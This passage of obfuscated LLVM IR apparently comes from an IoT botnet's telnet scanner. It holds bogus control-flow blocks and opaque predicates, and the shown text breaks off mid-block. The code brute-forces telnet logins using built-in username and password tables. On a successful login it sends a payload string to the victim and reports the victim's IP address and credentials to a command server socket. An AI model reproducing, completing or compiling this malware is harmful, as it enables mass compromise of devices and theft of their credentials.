  %3089 = call i64 @send(i32 %3088, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %3090 = load i32, i32* @mainCommSock, align 4
  %3091 = load i32, i32* %10, align 4
  %3092 = sext i32 %3091 to i64
  %3093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3092
  %3094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3093, i32 0, i32 1
  %3095 = bitcast i32* %3094 to %struct.in_addr*
  %3096 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3095, i32 0, i32 0
  %3097 = load i32, i32* %3096, align 4
  %3098 = call i8* @inet_ntoa(i32 %3097) #2
  %3099 = load i32, i32* %10, align 4
  %3100 = sext i32 %3099 to i64
  %3101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3100
  %3102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3101, i32 0, i32 4
  %3103 = load i8, i8* %3102, align 2
  %3104 = zext i8 %3103 to i64
  %3105 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %3104
  %3106 = load i8*, i8** %3105, align 8
  %3107 = load i32, i32* %10, align 4
  %3108 = sext i32 %3107 to i64
  %3109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3108
  %3110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3109, i32 0, i32 5
  %3111 = load i8, i8* %3110, align 1
  %3112 = zext i8 %3111 to i64
  %3113 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3112
  %3114 = load i8*, i8** %3113, align 8
  %3115 = call i32 (i32, i8*, ...) @sockprintf(i32 %3090, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %3098, i8* %3106, i8* %3114)
  br label %3344

; <label>:3116:                                   ; preds = %3056
  %3117 = load i32, i32* %10, align 4
  %3118 = sext i32 %3117 to i64
  %3119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3118
  %3120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3119, i32 0, i32 0
  %3121 = load i32, i32* %3120, align 16
  %3122 = load i32, i32* %10, align 4
  %3123 = sext i32 %3122 to i64
  %3124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3123
  %3125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3124, i32 0, i32 8
  %3126 = load i8*, i8** %3125, align 8
  %3127 = load i32, i32* %10, align 4
  %3128 = sext i32 %3127 to i64
  %3129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3128
  %3130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3129, i32 0, i32 7
  %3131 = load i16, i16* %3130, align 16
  %3132 = zext i16 %3131 to i32
  %3133 = call i32 @readUntil(i32 %3121, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3126, i32 1024, i32 %3132)
  %3134 = icmp ne i32 %3133, 0
  br i1 %3134, label %3135, label %3176

; <label>:3135:                                   ; preds = %3116
  %3136 = load i32, i32* %10, align 4
  %3137 = sext i32 %3136 to i64
  %3138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3137
  %3139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3138, i32 0, i32 6
  store i32 0, i32* %3139, align 4
  %3140 = load i32, i32* %10, align 4
  %3141 = sext i32 %3140 to i64
  %3142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3141
  %3143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3142, i32 0, i32 7
  store i16 0, i16* %3143, align 16
  %3144 = load i32, i32* %10, align 4
  %3145 = sext i32 %3144 to i64
  %3146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3145
  %3147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3146, i32 0, i32 0
  %3148 = load i32, i32* %3147, align 16
  %3149 = call i64 @send(i32 %3148, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %3150 = load i32, i32* @mainCommSock, align 4
  %3151 = load i32, i32* %10, align 4
  %3152 = sext i32 %3151 to i64
  %3153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3152
  %3154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3153, i32 0, i32 1
  %3155 = bitcast i32* %3154 to %struct.in_addr*
  %3156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3155, i32 0, i32 0
  %3157 = load i32, i32* %3156, align 4
  %3158 = call i8* @inet_ntoa(i32 %3157) #2
  %3159 = load i32, i32* %10, align 4
  %3160 = sext i32 %3159 to i64
  %3161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3160
  %3162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3161, i32 0, i32 4
  %3163 = load i8, i8* %3162, align 2
  %3164 = zext i8 %3163 to i64
  %3165 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %3164
  %3166 = load i8*, i8** %3165, align 8
  %3167 = load i32, i32* %10, align 4
  %3168 = sext i32 %3167 to i64
  %3169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3168
  %3170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3169, i32 0, i32 5
  %3171 = load i8, i8* %3170, align 1
  %3172 = zext i8 %3171 to i64
  %3173 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3172
  %3174 = load i8*, i8** %3173, align 8
  %3175 = call i32 (i32, i8*, ...) @sockprintf(i32 %3150, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %3158, i8* %3166, i8* %3174)
  br label %3344

; <label>:3176:                                   ; preds = %3116
  %3177 = load i32, i32* @x.67
  %3178 = load i32, i32* @y.68
  %3179 = sub i32 %3177, 1
  %3180 = mul i32 %3177, %3179
  %3181 = urem i32 %3180, 2
  %3182 = icmp eq i32 %3181, 0
  %3183 = icmp slt i32 %3178, 10
  %3184 = or i1 %3182, %3183
  br i1 %3184, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %3176
  %3185 = load i32, i32* %10, align 4
  %3186 = sext i32 %3185 to i64
  %3187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3186
  %3188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3187, i32 0, i32 0
  %3189 = load i32, i32* %3188, align 16
  %3190 = load i32, i32* %10, align 4
  %3191 = sext i32 %3190 to i64
  %3192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3191
  %3193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3192, i32 0, i32 8
  %3194 = load i8*, i8** %3193, align 8
  %3195 = load i32, i32* %10, align 4
  %3196 = sext i32 %3195 to i64
  %3197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3196
  %3198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3197, i32 0, i32 7
  %3199 = load i16, i16* %3198, align 16
  %3200 = zext i16 %3199 to i32
  %3201 = call i32 @readUntil(i32 %3189, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3194, i32 1024, i32 %3200)
  %3202 = icmp ne i32 %3201, 0
  %3203 = load i32, i32* @x.67
  %3204 = load i32, i32* @y.68
  %3205 = sub i32 %3203, 1
  %3206 = mul i32 %3203, %3205
  %3207 = urem i32 %3206, 2
  %3208 = icmp eq i32 %3207, 0
  %3209 = icmp slt i32 %3204, 10
  %3210 = or i1 %3208, %3209
  br i1 %3210, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %3202, label %3211, label %3271

; <label>:3211:                                   ; preds = %originalBBpart2332
  %3212 = load i32, i32* %10, align 4
  %3213 = sext i32 %3212 to i64
  %3214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3213
  %3215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3214, i32 0, i32 6
  store i32 0, i32* %3215, align 4
  %3216 = load i32, i32* %10, align 4
  %3217 = sext i32 %3216 to i64
  %3218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3217
  %3219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3218, i32 0, i32 7
  store i16 0, i16* %3219, align 16
  %3220 = load i32, i32* %10, align 4
  %3221 = sext i32 %3220 to i64
  %3222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3221
  %3223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3222, i32 0, i32 0
  %3224 = load i32, i32* %3223, align 16
  %3225 = call i64 @send(i32 %3224, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %3226 = load i32, i32* @mainCommSock, align 4
  %3227 = load i32, i32* %10, align 4
  %3228 = sext i32 %3227 to i64
  %3229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3228
  %3230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3229, i32 0, i32 1
  %3231 = bitcast i32* %3230 to %struct.in_addr*
  %3232 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3231, i32 0, i32 0
  %3233 = load i32, i32* %3232, align 4
  %3234 = call i8* @inet_ntoa(i32 %3233) #2
  %3235 = load i32, i32* %10, align 4
  %3236 = sext i32 %3235 to i64
  %3237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3236
  %3238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3237, i32 0, i32 4
  %3239 = load i8, i8* %3238, align 2
  %3240 = zext i8 %3239 to i64
  %3241 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %3240
  %3242 = load i8*, i8** %3241, align 8
  %3243 = load i32, i32* %10, align 4
  %3244 = sext i32 %3243 to i64
  %3245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3244
  %3246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3245, i32 0, i32 5
  %3247 = load i8, i8* %3246, align 1
  %3248 = zext i8 %3247 to i64
  %3249 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3248
  %3250 = load i8*, i8** %3249, align 8
  %3251 = call i32 (i32, i8*, ...) @sockprintf(i32 %3226, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %3234, i8* %3242, i8* %3250)
  %3252 = load i32, i32* %10, align 4
  %3253 = sext i32 %3252 to i64
  %3254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3253
  %3255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3254, i32 0, i32 8
  %3256 = load i8*, i8** %3255, align 8
  call void @llvm.memset.p0i8.i64(i8* %3256, i8 0, i64 1024, i32 1, i1 false)
  %3257 = load i32, i32* %10, align 4
  %3258 = sext i32 %3257 to i64
  %3259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3258
  %3260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3259, i32 0, i32 0
  %3261 = load i32, i32* %3260, align 16
  %3262 = call i32 @sclose(i32 %3261)
  %3263 = load i32, i32* %10, align 4
  %3264 = sext i32 %3263 to i64
  %3265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3264
  %3266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3265, i32 0, i32 3
  store i8 1, i8* %3266, align 1
  %3267 = load i32, i32* %10, align 4
  %3268 = sext i32 %3267 to i64
  %3269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3268
  %3270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3269, i32 0, i32 2
  store i8 0, i8* %3270, align 8
  br label %3344

; <label>:3271:                                   ; preds = %originalBBpart2332
  %3272 = load i32, i32* %10, align 4
  %3273 = sext i32 %3272 to i64
  %3274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3273
  %3275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3274, i32 0, i32 8
  %3276 = load i8*, i8** %3275, align 8
  %3277 = call i64 @strlen(i8* %3276) #10
  %3278 = trunc i64 %3277 to i16
  %3279 = load i32, i32* %10, align 4
  %3280 = sext i32 %3279 to i64
  %3281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3280
  %3282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3281, i32 0, i32 7
  store i16 %3278, i16* %3282, align 16
  br label %3283

; <label>:3283:                                   ; preds = %3271
  br label %3284

; <label>:3284:                                   ; preds = %3283
  br label %3285

; <label>:3285:                                   ; preds = %3284
  %3286 = load i32, i32* %10, align 4
  %3287 = sext i32 %3286 to i64
  %3288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3287
  %3289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3288, i32 0, i32 6
  %3290 = load i32, i32* %3289, align 4
  %3291 = add i32 %3290, 10
  %3292 = zext i32 %3291 to i64
  %3293 = call i64 @time(i64* null) #2
  %3294 = icmp slt i64 %3292, %3293
  br i1 %3294, label %3295, label %3326

; <label>:3295:                                   ; preds = %3285
  %3296 = load i32, i32* @x.67
  %3297 = load i32, i32* @y.68
  %3298 = sub i32 %3296, 1
  %3299 = mul i32 %3296, %3298
  %3300 = urem i32 %3299, 2
  %3301 = icmp eq i32 %3300, 0
  %3302 = icmp slt i32 %3297, 10
  %3303 = or i1 %3301, %3302
  br i1 %3303, label %originalBB334, label %originalBB334alteredBB

originalBB334:                                    ; preds = %originalBB334alteredBB, %3295
  %3304 = load i32, i32* %10, align 4
  %3305 = sext i32 %3304 to i64
  %3306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3305
  %3307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3306, i32 0, i32 0
  %3308 = load i32, i32* %3307, align 16
  %3309 = call i32 @sclose(i32 %3308)
  %3310 = load i32, i32* %10, align 4
  %3311 = sext i32 %3310 to i64
  %3312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3311
  %3313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3312, i32 0, i32 2
  store i8 0, i8* %3313, align 8
  %3314 = load i32, i32* %10, align 4
  %3315 = sext i32 %3314 to i64
  %3316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3315
  %3317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3316, i32 0, i32 3
  store i8 1, i8* %3317, align 1
  %3318 = load i32, i32* @x.67
  %3319 = load i32, i32* @y.68
  %3320 = sub i32 %3318, 1
  %3321 = mul i32 %3318, %3320
  %3322 = urem i32 %3321, 2
  %3323 = icmp eq i32 %3322, 0
  %3324 = icmp slt i32 %3319, 10
  %3325 = or i1 %3323, %3324
  br i1 %3325, label %originalBBpart2336, label %originalBB334alteredBB

originalBBpart2336:                               ; preds = %originalBB334
  br label %3326

; <label>:3326:                                   ; preds = %originalBBpart2336, %3285
  br label %3327

; <label>:3327:                                   ; preds = %3326, %2987, %originalBBpart2324, %originalBBpart2320, %2836, %2812, %originalBBpart2207, %1642, %1133, %originalBBpart2159, %originalBBpart299, %originalBBpart232, %101
  %3328 = load i32, i32* @x.67
  %3329 = load i32, i32* @y.68
  %3330 = sub i32 %3328, 1
  %3331 = mul i32 %3328, %3330
  %3332 = urem i32 %3331, 2
  %3333 = icmp eq i32 %3332, 0
  %3334 = icmp slt i32 %3329, 10
  %3335 = or i1 %3333, %3334
  br i1 %3335, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %3327
  %3336 = load i32, i32* @x.67
  %3337 = load i32, i32* @y.68
  %3338 = sub i32 %3336, 1
  %3339 = mul i32 %3336, %3338
  %3340 = urem i32 %3339, 2
  %3341 = icmp eq i32 %3340, 0
  %3342 = icmp slt i32 %3337, 10
  %3343 = or i1 %3341, %3342
  br i1 %3343, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br label %3344

; <label>:3344:                                   ; preds = %originalBBpart2340, %3211, %3135, %3075, %3022, %2925, %originalBBpart2316, %2821, %2737, %2712, %2655, %2630, %2573, %2548, %originalBBpart2280, %originalBBpart2276, %originalBBpart2267, %2336, %2279, %2254, %2197, %originalBBpart2251, %originalBBpart2247, %originalBBpart2239, %originalBBpart2231, %originalBBpart2223, %1884, %originalBBpart2219, %originalBBpart2203, %1684, %originalBBpart2195, %originalBBpart2191, %originalBBpart2187, %1473, %1450, %originalBBpart2179, %1356, %1333, %1310, %1296, %originalBBpart2163, %1118, %1095, %959, %860, %793, %originalBBpart2115, %627, %442, %233, %189
  %3345 = load i32, i32* @x.67
  %3346 = load i32, i32* @y.68
  %3347 = sub i32 %3345, 1
  %3348 = mul i32 %3345, %3347
  %3349 = urem i32 %3348, 2
  %3350 = icmp eq i32 %3349, 0
  %3351 = icmp slt i32 %3346, 10
  %3352 = or i1 %3350, %3351
  br i1 %3352, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %3344
  %3353 = load i32, i32* %10, align 4
  %3354 = add nsw i32 %3353, 1
  store i32 %3354, i32* %10, align 4
  %3355 = load i32, i32* @x.67
  %3356 = load i32, i32* @y.68
  %3357 = sub i32 %3355, 1
  %3358 = mul i32 %3355, %3357
  %3359 = urem i32 %3358, 2
  %3360 = icmp eq i32 %3359, 0
  %3361 = icmp slt i32 %3356, 10
  %3362 = or i1 %3360, %3361
  br i1 %3362, label %originalBBpart2350, label %originalBB342alteredBB

originalBBpart2350:                               ; preds = %originalBB342
  br label %97

; <label>:3363:                                   ; preds = %97
  br label %79
                                                  ; No predecessors!
  %3365 = load i32, i32* @x.67
  %3366 = load i32, i32* @y.68
  %3367 = sub i32 %3365, 1
  %3368 = mul i32 %3365, %3367
  %3369 = urem i32 %3368, 2
  %3370 = icmp eq i32 %3369, 0
  %3371 = icmp slt i32 %3366, 10
  %3372 = or i1 %3370, %3371
  br i1 %3372, label %originalBB352, label %originalBB352alteredBB

originalBB352:                                    ; preds = %originalBB352alteredBB, %3364
  %3373 = load i32, i32* @x.67
  %3374 = load i32, i32* @y.68
  %3375 = sub i32 %3373, 1
  %3376 = mul i32 %3373, %3375
  %3377 = urem i32 %3376, 2
  %3378 = icmp eq i32 %3377, 0
  %3379 = icmp slt i32 %3374, 10
  %3380 = or i1 %3378, %3379
  br i1 %3380, label %originalBBpart2354, label %originalBB352alteredBB

originalBBpart2354:                               ; preds = %originalBB352
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %3381 = alloca i32, align 4
  %3382 = alloca i32, align 4
  %3383 = alloca i32, align 4
  %3384 = alloca %struct.__sigset_t, align 8
  %3385 = alloca %struct.timeval, align 8
  %3386 = alloca i32, align 4
  %3387 = alloca i32, align 4
  %3388 = alloca %struct.sockaddr_in, align 4
  %3389 = alloca i8*, align 8
  %3390 = alloca %struct.timeval, align 8
  %3391 = alloca i8*, align 8
  %3392 = alloca i32, align 4
  %3393 = alloca i32, align 4
  %3394 = call i32 @getdtablesize() #2
  %_ = shl i32 %3394, 4
  %_1 = sub i32 %3394, 4
  %gen = mul i32 %_1, 4
  %_2 = sub i32 %3394, 4
  %gen3 = mul i32 %_2, 4
  %_4 = shl i32 %3394, 4
  %_5 = sub i32 %3394, 4
  %gen6 = mul i32 %_5, 4
  %3395 = sdiv i32 %3394, 4
  %_7 = sub i32 %3395, 3
  %gen8 = mul i32 %_7, 3
  %_9 = shl i32 %3395, 3
  %_10 = sub i32 0, %3395
  %gen11 = add i32 %_10, 3
  %_12 = sub i32 %3395, 3
  %gen13 = mul i32 %_12, 3
  %_14 = sub i32 0, %3395
  %gen15 = add i32 %_14, 3
  %3396 = mul nsw i32 %3395, 3
  store i32 %3396, i32* %3381, align 4
  %3397 = load i32, i32* %3381, align 4
  %3398 = icmp sgt i32 %3397, 512
  br label %originalBB

originalBB16alteredBB:                            ; preds = %originalBB16, %79
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %140
  %3399 = load i32, i32* %10, align 4
  %3400 = sext i32 %3399 to i64
  %3401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3400
  %3402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3401, i32 0, i32 5
  %3403 = load i8, i8* %3402, align 1
  %_21 = sub i8 %3403, 1
  %gen22 = mul i8 %_21, 1
  %3404 = add i8 %3403, 1
  store i8 %3404, i8* %3402, align 1
  %3405 = load i32, i32* %10, align 4
  %3406 = sext i32 %3405 to i64
  %3407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3406
  %3408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3407, i32 0, i32 5
  %3409 = load i8, i8* %3408, align 1
  %3410 = zext i8 %3409 to i64
  %3411 = icmp eq i64 %3410, 13
  br label %originalBB20

originalBB26alteredBB:                            ; preds = %originalBB26, %271
  %3412 = load i32, i32* %10, align 4
  %3413 = sext i32 %3412 to i64
  %3414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3413
  %3415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3414, i32 0, i32 2
  store i8 1, i8* %3415, align 8
  %3416 = load i32, i32* %10, align 4
  %3417 = sext i32 %3416 to i64
  %3418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3417
  %3419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3418, i32 0, i32 6
  store i32 0, i32* %3419, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %296
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %313
  %3420 = load i32, i32* %10, align 4
  %3421 = sext i32 %3420 to i64
  %3422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3421
  %3423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3422, i32 0, i32 6
  %3424 = load i32, i32* %3423, align 4
  %3425 = icmp eq i32 %3424, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %353
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %370
  %3426 = load i32, i32* %10, align 4
  %3427 = sext i32 %3426 to i64
  %3428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3427
  %3429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3428, i32 0, i32 0
  %3430 = load i32, i32* %3429, align 16
  %_43 = sub i32 %3430, 64
  %gen44 = mul i32 %_43, 64
  %_45 = shl i32 %3430, 64
  %_46 = shl i32 %3430, 64
  %_47 = sub i32 0, %3430
  %gen48 = add i32 %_47, 64
  %_49 = shl i32 %3430, 64
  %3431 = srem i32 %3430, 64
  %3432 = zext i32 %3431 to i64
  %_50 = sub i64 1, %3432
  %gen51 = mul i64 %_50, %3432
  %_52 = sub i64 1, %3432
  %gen53 = mul i64 %_52, %3432
  %_54 = shl i64 1, %3432
  %_55 = sub i64 1, %3432
  %gen56 = mul i64 %_55, %3432
  %_57 = sub i64 1, %3432
  %gen58 = mul i64 %_57, %3432
  %3433 = shl i64 1, %3432
  %3434 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %3435 = load i32, i32* %10, align 4
  %3436 = sext i32 %3435 to i64
  %3437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3436
  %3438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3437, i32 0, i32 0
  %3439 = load i32, i32* %3438, align 16
  %_59 = sub i32 %3439, 64
  %gen60 = mul i32 %_59, 64
  %3440 = sdiv i32 %3439, 64
  %3441 = sext i32 %3440 to i64
  %3442 = getelementptr inbounds [16 x i64], [16 x i64]* %3434, i64 0, i64 %3441
  %3443 = load i64, i64* %3442, align 8
  %_61 = sub i64 0, %3443
  %gen62 = add i64 %_61, %3433
  %_63 = shl i64 %3443, %3433
  %_64 = sub i64 0, %3443
  %gen65 = add i64 %_64, %3433
  %_66 = shl i64 %3443, %3433
  %_67 = shl i64 %3443, %3433
  %3444 = or i64 %3443, %3433
  store i64 %3444, i64* %3442, align 8
  %3445 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %3445, align 8
  %3446 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %3446, align 8
  %3447 = load i32, i32* %10, align 4
  %3448 = sext i32 %3447 to i64
  %3449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3448
  %3450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3449, i32 0, i32 0
  %3451 = load i32, i32* %3450, align 16
  %_68 = sub i32 %3451, 1
  %gen69 = mul i32 %_68, 1
  %_70 = sub i32 0, %3451
  %gen71 = add i32 %_70, 1
  %3452 = add nsw i32 %3451, 1
  %3453 = call i32 @select(i32 %3452, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %3453, i32* %11, align 4
  %3454 = load i32, i32* %11, align 4
  %3455 = icmp eq i32 %3454, 1
  br label %originalBB42

originalBB75alteredBB:                            ; preds = %originalBB75, %493
  %3456 = load i32, i32* %10, align 4
  %3457 = sext i32 %3456 to i64
  %3458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3457
  %3459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3458, i32 0, i32 6
  %3460 = load i32, i32* %3459, align 4
  %_76 = sub i32 %3460, 10
  %gen77 = mul i32 %_76, 10
  %_78 = sub i32 %3460, 10
  %gen79 = mul i32 %_78, 10
  %_80 = sub i32 0, %3460
  %gen81 = add i32 %_80, 10
  %_82 = sub i32 %3460, 10
  %gen83 = mul i32 %_82, 10
  %_84 = sub i32 %3460, 10
  %gen85 = mul i32 %_84, 10
  %_86 = sub i32 %3460, 10
  %gen87 = mul i32 %_86, 10
  %_88 = sub i32 0, %3460
  %gen89 = add i32 %_88, 10
  %_90 = shl i32 %3460, 10
  %_91 = sub i32 0, %3460
  %gen92 = add i32 %_91, 10
  %_93 = shl i32 %3460, 10
  %3461 = add i32 %3460, 10
  %3462 = zext i32 %3461 to i64
  %3463 = call i64 @time(i64* null) #2
  %3464 = icmp slt i64 %3462, %3463
  br label %originalBB75

originalBB97alteredBB:                            ; preds = %originalBB97, %534
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %558
  %3465 = call i64 @time(i64* null) #2
  %3466 = trunc i64 %3465 to i32
  %3467 = load i32, i32* %10, align 4
  %3468 = sext i32 %3467 to i64
  %3469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3468
  %3470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3469, i32 0, i32 6
  store i32 %3466, i32* %3470, align 4
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %667
  %3471 = load i32, i32* %10, align 4
  %3472 = sext i32 %3471 to i64
  %3473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3472
  %3474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3473, i32 0, i32 2
  store i8 5, i8* %3474, align 8
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %688
  %3475 = load i32, i32* %10, align 4
  %3476 = sext i32 %3475 to i64
  %3477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3476
  %3478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3477, i32 0, i32 8
  %3479 = load i8*, i8** %3478, align 8
  call void @llvm.memset.p0i8.i64(i8* %3479, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %710
  %3480 = load i32, i32* %10, align 4
  %3481 = sext i32 %3480 to i64
  %3482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3481
  %3483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3482, i32 0, i32 2
  store i8 3, i8* %3483, align 8
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %766
  %3484 = load i32, i32* %10, align 4
  %3485 = sext i32 %3484 to i64
  %3486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3485
  %3487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3486, i32 0, i32 2
  store i8 5, i8* %3487, align 8
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %833
  %3488 = load i32, i32* %10, align 4
  %3489 = sext i32 %3488 to i64
  %3490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3489
  %3491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3490, i32 0, i32 2
  store i8 5, i8* %3491, align 8
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %865
  %3492 = load i32, i32* %10, align 4
  %3493 = sext i32 %3492 to i64
